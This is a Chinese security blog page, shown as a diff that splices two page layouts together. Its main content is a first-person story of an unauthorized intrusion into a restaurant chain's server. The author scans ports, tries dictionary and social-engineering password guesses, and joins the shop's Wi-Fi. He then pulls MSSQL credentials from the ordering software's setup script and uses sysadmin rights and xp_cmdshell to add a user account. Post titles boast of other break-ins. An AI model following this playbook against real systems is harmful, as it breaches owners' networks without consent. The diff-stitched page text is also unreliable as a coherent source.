-        <p>某日与朋友一起去某西餐厅吃饭，餐厅人员向我们介绍说关注他们企业的微博就可以参加他们的免费抽奖，回来后上了他们官方网站看了一下，果然用DZ论坛搭建了个幸运抽奖大转盘插件，抽了好几次都是消费券，运气背啊。看他们网站美工做的不错，不知道安全咋样。仔细看了下他们的网站主站不知道是什么PHP的CMS系统、论坛是DZ-X2.5   <br />.主站看了半天没有发现可利用的地方，又没有可用的论坛0day。</p>  <p><a href="http://img.cker.in/170410a41f50_92E/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/170410a41f50_92E/clip_image001_thumb.jpg" width="578" height="331" /></a></p>  <p>山不转水转，不能在一棵树上吊死，既然网站没有可利用，不妨从服务器上下手，或许有意想不到的收获。ip138.com中解析到的网站IP是我们城市电信IP，初步断定服务器要么托管到电信机房的，要么是在自己公司的机房内的(看他们网站上说有十多家分店，应该用的独立服务器)，直接用X-SCAN扫描IP 服务器开了21、3389 、1433等端口，这下有戏了随便破解出一个账号密码就有机会了，事实是残酷的，扫描完我所有的字典，也没有猜解出来。暴力破解不行。咋们社工吧，用他们的企业名字+电话号码组合了一下字典，还是无获而终，入侵陷入了僵局了。</p>  <p>山重水复疑无路，柳暗花明又一村。有新思路了，一般这样中高档的餐厅，有免费的wifi提供的，可以通过wifi连接到他们店铺的内网，再探索有用的价值。第二天，提着一个本子、叫了一份果汁，问服务员要了密码，迫不及待的连接上wifi 首先用这个wifi密码依次登陆ftp、远程终端、MSSQL均提示密码错误，这也在我意料之内。打开X-SAN扫描了一下网段，就我自己的一台存活主机，应该是网段隔离了吧。管理人员的安全意识还是不错的啊。喝了口果汁，看到服务员在操作点单系统、凑前瞄了一眼，XX餐饮系统，顺手百度了一下，下载一个试用版的安装看有没有可利用的<a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a>，苍天不负有心人，发现这套餐饮系统用的是ODBC数据源连接MSSQL数据库的意思就是连接数据库的密码是保存在软件中得或者配置文件中的。看到一个新建数据库的SQL脚本打开一看，密码、用户名、数据库名一目了然。</p>  <p><a href="http://img.cker.in/170410a41f50_92E/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/170410a41f50_92E/clip_image002_thumb.jpg" width="578" height="167" /></a></p>  <p>果断的用查询分析器连接网站IP、哈哈人品终于爆发了，连接成功,还是sysadmin权限乘热打铁利用XP_CMDSHELL执行net user命令，添加用户成功。</p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/939.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/951.seo/" title="深夜劫持雾隐技术小组" itemprop="url">
   
-  <nav class="pagination" role="pagination">
-    <a class="newer-posts" href="/category/渗透测试/page/4/">← Newer Posts</a>
-    <span class="page-number">Page 5 of 16</span>
-    <a class="older-posts" href="/category/渗透测试/page/6/">Older Posts →</a>
+    <h1 itemprop="name">深夜劫持雾隐技术小组</h1>
+    
+    <time datetime="2012-12-07T06:42:03.000Z" itemprop="datePublished">2012-12-07</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/947.seo/" title="小米科技成功渗透进内部网络" itemprop="url">
+  
+    <h1 itemprop="name">小米科技成功渗透进内部网络</h1>
+    
+    <time datetime="2012-11-24T12:47:07.000Z" itemprop="datePublished">2012-11-24</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/946.seo/" title="友情检测张柏芝官方网站全过程" itemprop="url">
+  
+    <h1 itemprop="name">友情检测张柏芝官方网站全过程</h1>
+    
+    <time datetime="2012-11-24T12:30:54.000Z" itemprop="datePublished">2012-11-24</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/939.seo/" title="对某餐饮管理服务有限公司网络渗透" itemprop="url">
+  
+    <h1 itemprop="name">对某餐饮管理服务有限公司网络渗透</h1>
+    
+    <time datetime="2012-11-19T08:40:25.000Z" itemprop="datePublished">2012-11-19</time>
+  </a>
+</section>
+
+
+  <nav id="page-nav" class="clearfix archive-nav">
+    <a class="extend prev" rel="prev" href="/category/渗透测试/page/4/">&laquo; 上一页</a><a class="page-number" href="/category/渗透测试/">1</a><span class="space">&hellip;</span><a class="page-number" href="/category/渗透测试/page/3/">3</a><a class="page-number" href="/category/渗透测试/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/category/渗透测试/page/6/">6</a><a class="page-number" href="/category/渗透测试/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/category/渗透测试/page/16/">16</a><a class="extend next" rel="next" href="/category/渗透测试/page/6/">下一页 &raquo;</a>
   </nav>
-</main>
 
-
-      
-<footer class="site-footer">
-  
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
   </div>
+</div>
+
+      </div>
+      <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
 </footer>
+      <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
 
 
 
-  </div>
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
 </div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
 
-<nav  class="outer-nav top horizontal">
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
+    </body>
+   </html>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
-
-          <a class="icon-image"  href="/images"><span>Images</span></a>
-
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
-
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
-
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
-
-</nav>
-
-</div>
-</body>
-</html>
